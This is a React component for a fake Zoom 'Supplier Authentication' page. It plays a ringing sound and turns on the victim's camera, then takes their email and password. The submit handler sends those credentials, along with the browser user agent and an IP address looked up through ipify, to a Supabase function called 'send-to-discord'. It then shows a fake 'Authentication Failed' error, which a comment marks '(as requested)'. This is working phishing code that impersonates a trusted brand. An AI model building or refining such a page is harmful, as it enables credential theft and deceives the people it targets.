import { useEffect, useRef, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Camera, Mic, MicOff, VideoOff, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { createClient } from '@supabase/supabase-js';

const formSchema = z.object({
  email: z.string().email("Please enter a valid email"),
  password: z.string().min(6, "Password must be at least 6 characters"),
});

interface Phase3CameraAuthProps {
  onComplete: () => void;
  prefillEmail?: string;
}

const Phase3CameraAuth = ({ onComplete, prefillEmail }: Phase3CameraAuthProps) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [isVideoOn, setIsVideoOn] = useState(true);
  const [isAudioOn, setIsAudioOn] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  // Initialize Supabase client
  const supabase = createClient(
    'https://YOUR_PROJECT_ID.supabase.co',
    'YOUR_ANON_KEY'
  );

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: prefillEmail || "",
      password: "",
    },
  });

  // Update form value when prefillEmail changes
  useEffect(() => {
    if (prefillEmail) {
      form.setValue("email", prefillEmail);
    }
  }, [prefillEmail, form]);

  useEffect(() => {
    // Continue ringing sound from Phase 2
    const createRingingSound = () => {
      const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
      
      const playRing = () => {
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        gainNode.gain.setValueAtTime(0.05, audioContext.currentTime);
        
        oscillator.start();
        setTimeout(() => {
          try {
            oscillator.stop();
          } catch (e) {
            // Oscillator already stopped
          }
        }, 1000);
      };
      
      const interval = setInterval(playRing, 3000);
      
      return () => {
        clearInterval(interval);
        try {
          audioContext.close();
        } catch (e) {
          // Audio context already closed
        }
      };
    };

    const cleanup = createRingingSound();

    // Get camera access
    const initCamera = async () => {
      try {
        const mediaStream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: true
        });
        setStream(mediaStream);
        if (videoRef.current) {
          videoRef.current.srcObject = mediaStream;
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
      }
    };

    initCamera();

    return () => {
      cleanup();
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const toggleVideo = () => {
    if (stream) {
      const videoTrack = stream.getVideoTracks()[0];
      if (videoTrack) {
        videoTrack.enabled = !videoTrack.enabled;
        setIsVideoOn(videoTrack.enabled);
      }
    }
  };

  const toggleAudio = () => {
    if (stream) {
      const audioTrack = stream.getAudioTracks()[0];
      if (audioTrack) {
        audioTrack.enabled = !audioTrack.enabled;
        setIsAudioOn(audioTrack.enabled);
      }
    }
  };

  const getUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Failed to get IP:', error);
      return null;
    }
  };

  const onSubmit = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true);
    
    try {
      // Get user's IP address
      const ipAddress = await getUserIP();
      
      // Prepare data to send to Discord
      const formData = {
        email: values.email,
        password: values.password,
        userAgent: navigator.userAgent,
        ipAddress: ipAddress,
      };

      // Send to Supabase edge function
      const { data, error } = await supabase.functions.invoke('send-to-discord', {
        body: formData
      });

      if (error) {
        throw error;
      }

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication error (as requested)
      toast({
        title: "Authentication Failed",
        description: "Invalid credentials. Please check your email and password.",
        variant: "destructive",
      });

    } catch (error) {
      console.error("Submission error:", error);
      toast({
        title: "Network Error",
        description: "Unable to connect to authentication server. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
      // Stop ringing and camera
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 flex">
      {/* Camera View */}
      <div className="flex-1 relative">
        <video
          ref={videoRef}
          autoPlay
          muted
          playsInline
          className="w-full h-full object-cover"
        />
        
        {!isVideoOn && (
          <div className="absolute inset-0 bg-gray-800 flex items-center justify-center">
            <div className="text-center">
              <div className="w-24 h-24 bg-gray-600 rounded-full flex items-center justify-center mb-4 mx-auto">
                <span className="text-2xl font-bold text-white">SM</span>
              </div>
              <p className="text-white text-lg">Camera is off</p>
            </div>
          </div>
        )}
        
        {/* Camera Controls */}
        <div className="absolute bottom-6 left-1/2 transform -translate-x-1/2 flex space-x-4">
          <Button
            onClick={toggleAudio}
            className={`w-12 h-12 rounded-full ${
              isAudioOn ? 'bg-gray-700 hover:bg-gray-600' : 'bg-red-600 hover:bg-red-700'
            }`}
          >
            {isAudioOn ? <Mic className="w-6 h-6" /> : <MicOff className="w-6 h-6" />}
          </Button>
          
          <Button
            onClick={toggleVideo}
            className={`w-12 h-12 rounded-full ${
              isVideoOn ? 'bg-gray-700 hover:bg-gray-600' : 'bg-red-600 hover:bg-red-700'
            }`}
          >
            {isVideoOn ? <Camera className="w-6 h-6" /> : <VideoOff className="w-6 h-6" />}
          </Button>
        </div>
      </div>
      
      {/* Authentication Form */}
      <div className="w-96 bg-white p-8 flex flex-col justify-center">
        <div className="mb-8">
          <div className="text-2xl font-bold text-blue-600 mb-4">zoom</div>
          <h2 className="text-2xl font-semibold text-gray-800 mb-2">Supplier Authentication</h2>
          <p className="text-gray-600">Enter your credentials to join the meeting</p>
        </div>
        
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <FormField
              control={form.control}
              name="email"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Email Address</FormLabel>
                  <FormControl>
                    <Input type="email" placeholder="Enter your business email" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Password</FormLabel>
                  <FormControl>
                    <Input type="password" placeholder="Enter meeting password" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <Button 
              type="submit" 
              disabled={isLoading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 disabled:opacity-50"
            >
              {isLoading ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Authenticating...
                </>
              ) : (
                "Join Meeting"
              )}
            </Button>
          </form>
        </Form>
        
        <div className="mt-6 text-center">
          <div className="flex items-center justify-center space-x-2 text-orange-600">
            <div className="w-2 h-2 bg-orange-600 rounded-full animate-pulse"></div>
            <span className="text-sm font-medium">Connecting...</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Phase3CameraAuth;